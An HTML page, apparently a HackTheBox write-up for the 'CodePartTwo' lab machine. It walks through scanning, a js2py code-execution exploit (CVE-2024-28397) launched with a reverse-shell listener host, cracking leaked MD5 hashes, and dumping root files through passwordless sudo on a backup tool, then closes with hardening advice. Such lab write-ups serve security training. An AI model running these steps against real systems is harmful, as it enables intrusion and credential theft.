<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CodePartTwo HTB Writeup</title>

<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">

<style>
:root{
  --bg:#07020f;
  --panel:#0d061a;
  --neon:#b45cff;
  --cyan:#4deeea;
  --text:#cfc6e4;
  --success:#22c55e;
  --danger:#ef4444;
  --warn:#facc15;
}

*{box-sizing:border-box}

body{
  margin:0;
  min-height:100vh;
  background:
    radial-gradient(800px 400px at 20% 10%, rgba(180,92,255,0.12), transparent 40%),
    radial-gradient(600px 300px at 80% 90%, rgba(77,238,234,0.12), transparent 40%),
    linear-gradient(180deg, #05010b, var(--bg));
  font-family:'Press Start 2P', monospace;
  color:var(--text);
  image-rendering:pixelated;
}

/* scanlines */
body::before{
  content:"";
  position:fixed;
  inset:0;
  background:linear-gradient(
    rgba(0,0,0,0.12) 50%,
    rgba(255,255,255,0.03) 51%
  );
  background-size:100% 4px;
  pointer-events:none;
}

/* noise */
body::after{
  content:"";
  position:fixed;
  inset:0;
  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='120'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.8' numOctaves='2' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='120' height='120' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");
  pointer-events:none;
}

.container{
  max-width:1100px;
  margin:40px auto;
  padding:0 12px;
}

.panel{
  background:linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01));
  border:2px solid rgba(180,92,255,0.25);
  box-shadow:0 0 40px rgba(180,92,255,0.15);
  padding:36px;
  position:relative;
}

/* glowing border */
.panel::before{
  content:"";
  position:absolute;
  inset:-2px;
  border:2px solid var(--neon);
  opacity:0.35;
  animation:pulse 3s infinite;
  pointer-events:none;
}

@keyframes pulse{
  0%,100%{opacity:.25}
  50%{opacity:.55}
}

h1{
  margin:0 0 14px 0;
  color:var(--neon);
  font-size:18px;
  text-shadow:0 0 18px rgba(180,92,255,.5);
}

.subtitle{
  font-size:9px;
  color:var(--cyan);
  margin-bottom:26px;
}

h2{
  font-size:12px;
  color:var(--neon);
  margin:34px 0 14px;
  border-bottom:1px solid rgba(180,92,255,0.3);
  padding-bottom:8px;
}

h3{
  font-size:10px;
  color:var(--cyan);
  margin:22px 0 10px;
}

p,li{
  font-size:9px;
  line-height:1.7;
}

ul{
  padding-left:18px;
}

.code{
  background:var(--panel);
  border:1px solid rgba(180,92,255,0.35);
  padding:14px;
  margin:14px 0;
  font-size:9px;
  color:#f3e8ff;
  white-space:pre-wrap;
}

.box{
  margin:14px 0;
  padding:14px;
  font-size:9px;
  border-left:3px solid;
  background:rgba(255,255,255,0.04);
}

.info{border-color:var(--cyan)}
.success{border-color:var(--success)}
.warn{border-color:var(--warn)}
.danger{border-color:var(--danger)}

.tools{
  display:grid;
  grid-template-columns:repeat(auto-fit,minmax(120px,1fr));
  gap:10px;
  margin-top:14px;
}

.tool{
  background:var(--panel);
  border:1px solid rgba(180,92,255,0.35);
  text-align:center;
  padding:10px;
  font-size:9px;
}

.footer{
  margin-top:40px;
  font-size:8px;
  color:#8e86a8;
  text-align:center;
}
</style>
</head>

<body>
<div class="container">
<div class="panel">

<h1>CodePartTwo HTB Writeup</h1>
<div class="subtitle">HackTheBox Machine Walkthrough</div>

<h2>Machine Information</h2>
<ul>
<li><strong>Name:</strong> CodePartTwo</li>
<li><strong>IP:</strong> 10.10.11.82</li>
<li><strong>Difficulty:</strong> Medium</li>
<li><strong>OS:</strong> Linux</li>
</ul>

<h2>Reconnaissance</h2>

<h3>Initial Scan</h3>
<div class="code">nmap -sC -sV 10.10.11.82</div>
<div class="box info">Results: SSH (22) and HTTP (8000) services found</div>
<div class="code">
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
8000/tcp open http Gunicorn 20.0.4
</div>

<h2>Web Application Enumeration</h2>

<h3>Source Code Exposure</h3>
<div class="code">
wget http://10.10.11.82:8000/download
unzip download
</div>
<div class="box danger">
Critical Finding: Application source code downloadable without authentication
</div>

<h3>Vulnerability Discovery</h3>
<div class="code">
@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)  # VULNERABLE
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})
</div>
<div class="box danger">
Vulnerability: Unrestricted JavaScript code execution via js2py
</div>

<h2>Initial Access</h2>

<h3>Code Execution Exploitation</h3>
<div class="code">
python3 exploit.py --target http://10.10.11.82:8000/run_code --lhost 10.10.14.X
</div>
<div class="box success">
Success: Reverse shell obtained via CVE-2024-28397
</div>

<h2>User Enumeration</h2>

<h3>Database Analysis</h3>
<div class="code">
cd /home/app/app/instance/
cat users.db
</div>
<div class="box info">
Users Found:<br>
• appa: 97588c0e27a3a024876339e27aeb42e (MD5)<br>
• marco: 649c9d65a206a75f5abe509fe128bce5 (MD5)
</div>
<div class="box warn">
Note: Database file readable directly without SQL commands
</div>

<h3>Password Cracking</h3>
<div class="code">
# Using crackstation.net
# Hash: 649c9d65a206a75f5abe509fe128bce5
</div>
<div class="box success">
Cracked: marco → sweetangelbabylove
</div>

<h3>User Access</h3>
<div class="code">ssh marco@10.10.11.82</div>
<div class="box success">
User Flag: 258c8672a671e445193724583319d271
</div>

<h2>Privilege Escalation</h2>

<h3>Sudo Privileges</h3>
<div class="code">sudo -l</div>
<div class="box info">
Result: Marco can run /usr/local/bin/npbackup-cli as root without password
</div>

<h3>Snapshot Discovery</h3>
<div class="code">sudo npbackup-cli -c npbackup.conf --snapshots</div>
<div class="box info">Snapshot Found: d62557e8</div>

<h3>Root Flag Extraction</h3>
<div class="code">
sudo npbackup-cli -c npbackup.conf -f --dump /root/root.txt --snapshot-id d62557e8
</div>
<div class="box success">
Root Flag: d81d5b0f72c2378eaca987562d253fae
</div>

<h2>Key Attack Vectors</h2>
<ul>
<li>Insecure JavaScript execution via js2py</li>
<li>Weak MD5 password storage</li>
<li>Unauthenticated source code exposure</li>
<li>Sudo misconfiguration allowing root file access</li>
</ul>

<h2>Security Recommendations</h2>

<h3>Input Validation</h3>
<ul>
<li>Sanitize and validate all inputs</li>
<li>Avoid eval_js with user data</li>
<li>Sandbox code execution</li>
</ul>

<h3>Password Security</h3>
<ul>
<li>Use bcrypt / Argon2</li>
<li>Password complexity enforcement</li>
<li>Credential rotation</li>
</ul>

<h3>Access Control</h3>
<ul>
<li>Least privilege sudo configs</li>
<li>Restrict backup utility access</li>
<li>Secure database permissions</li>
</ul>

<h2>Tools Used</h2>
<div class="tools">
<div class="tool">nmap</div>
<div class="tool">curl</div>
<div class="tool">crackstation.net</div>
<div class="tool">netcat</div>
<div class="tool">npbackup-cli</div>
</div>

<div class="footer">
offense first · learn by breaking things
</div>

</div>
</div>
</body>
</html>
